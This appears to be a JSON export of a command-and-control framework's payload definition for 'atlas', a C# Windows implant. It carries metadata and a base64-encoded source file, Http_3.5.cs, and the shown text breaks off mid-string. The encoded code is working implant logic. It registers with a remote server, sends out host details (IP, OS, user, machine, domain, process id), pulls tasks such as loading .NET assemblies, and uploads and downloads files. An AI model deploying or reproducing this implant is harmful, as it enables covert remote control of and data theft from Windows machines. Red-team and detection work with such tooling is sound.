{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "\n",
      "supported_os": "Windows (x86),Windows (x64)",
      "execute_help": "Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@Airzero24",
      "note": "This payload uses C# to target Windows hosts with the .NET framework installed. For more information and a more detailed README, check out: https:\/\/github.com\/airzero24\/Atlas",
      "supports_dynamic_loading": false,
      "deleted": false,
      "last_heartbeat": "03\/06\/2020 17:27:58",
      "ptype": "atlas",
      "file_extension": "cs",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "Http_3.5.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWdlKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gSm9iLmNodW5rX251bSkgJiAoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5jaHVua2luZ19zdGFydGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkVGFza2luZyBVcGxvYWRUYXNraW5nID0gVXRpbHMuVXBsb2FkVGFza2luZy5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5maWxlX2lkID0gVXBsb2FkVGFza2luZy5hc3NlbWJseV9pZDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBVcGxvYWRUYXNraW5nLnJlbW90ZV9wYXRoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgVXBsb2FkID0gbmV3IFV0aWxzLlVwbG9hZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAidXBsb2FkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX3NpemUgPSBDb25maWcuQ2h1bmtTaXplLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gSHR0cC5HZXRVcGxvYWQoVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IFVwbG9hZFJlc3BvbnNlLnRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua2luZ19zdGFydGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgQ2h1bmtVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChDaHVua1VwbG9hZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKFVwbG9hZFJlc3BvbnNlLmNodW5rX2RhdGEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBVdGlscy5HZXRUYXNraW5nIEdldFRhc2tpbmcgPSBuZXcgVXRpbHMuR2V0VGFza2luZw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gImdldF90YXNraW5nIiwNCiAgICAgICAgICAgICAgICAgICAgdGFza2luZ19zaXplID0gMw0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLkdldFRhc2tpbmcuVG9Kc29uKEdldFRhc2tpbmcpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBpZiAoZmluYWxfcmVzdWx0LlN1YnN0cmluZygwLCAzNikgIT0gQ29uZmlnLlVVSUQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZSBHZXRUYXNrUmVzcG9uc2UgPSBVdGlscy5HZXRUYXNraW5nUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGlmIChHZXRUYXNrUmVzcG9uc2UudGFza3NbMF0uY29tbWFuZCA9PSAiIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuVGFzayB0YXNrIGluIEdldFRhc2tSZXNwb25zZS50YXNrcykgew0KICAgICAgICAgICAgICAgICAgICBVdGlscy5Kb2IgSm9iID0gbmV3IFV0aWxzLkpvYg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBqb2JfaWQgPSBKb2JMaXN0LmpvYl9jb3VudCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSB0YXNrLmlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBqb2Jfc3RhcnRlZCA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRhc2suY29tbWFuZCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB0YXNrLnBhcmFtZXRlcnMsDQogICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSAwDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IiB8fCBKb2IuY29tbWFuZCA9PSAidXBsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnVwbG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0gPSAxOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJkb3dubG9hZCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5kb3dubG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImpvYnMiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBNb2R1bGVzLkdldEpvYnMoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9ia2lsbCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNb2R1bGVzLktpbGxKb2IoSm9iTGlzdCwgSW50MzIuUGFyc2UoSm9iLnBhcmFtZXRlcnMpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkpvYiBzdWNjZXNzZnVsbHkgcmVtb3ZlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IHJlbW92ZSBqb2IiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5BZGQoSm9iKTsNCiAgICAgICAgICAgICAgICAgICAgKytKb2JMaXN0LmpvYl9jb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgVXRpbHMuVXBsb2FkUmVzcG9uc2UgR2V0VXBsb2FkKFV0aWxzLlVwbG9hZCBVcGxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IFV0aWxzLlVwbG9hZFJlc3BvbnNlLkZyb21Kc29uKGZpbmFsX3Jlc3VsdC5TdWJzdHJpbmcoMzYpKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBuZXcgVXRpbHMuVXBsb2FkUmVzcG9uc2UgeyB9Ow0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBQb3N0UmVzcG9uc2UoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5Qb3N0UmVzcG9uc2UgUG9zdFJlc3BvbnNlID0gbmV3IFV0aWxzLlBvc3RSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInBvc3RfcmVzcG9uc2UiLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSB7IH0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21wbGV0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5zdWNjZXNzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gImVycm9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gImZhbHNlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSm9iLnRvdGFsX2NodW5rcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9